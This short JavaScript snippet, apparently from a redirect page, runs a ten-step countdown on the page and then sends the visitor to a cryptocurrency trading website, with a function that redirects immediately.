let countdownElement = document.getElementById('countdown');
let countdown = 10;

function updateCountdown() {
    countdown--;
    countdownElement.textContent = countdown;
    if (countdown <= 0) {
        window.location.href = 'https://bitcoinfinancetrading.com';
    }
}

function redirectNow() {
    window.location.href = 'https://bitcoinfinancetrading.com';
}

setInterval(updateCountdown, 2000);
